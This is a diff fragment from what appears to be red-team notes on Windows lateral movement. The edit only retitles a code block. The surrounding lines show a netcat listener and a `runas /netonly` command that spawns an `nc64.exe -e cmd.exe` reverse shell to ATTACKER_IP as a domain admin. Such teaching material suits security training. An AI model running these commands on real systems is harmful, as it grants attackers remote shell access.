@@ -94,7 +94,7 @@ $ nc -lvnp 8888
 
 From the remote shell session (step 1), we can spawn a new `/netonly` shell to allow us to perform network connections/requests as the admin:
 
-{% code overflow="wrap" %}
+{% code title="jmp.test.com (user)" overflow="wrap" %}
 ```sh
 C:\> runas.exe /netonly /user:test.com\admin "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 8888"
 ```
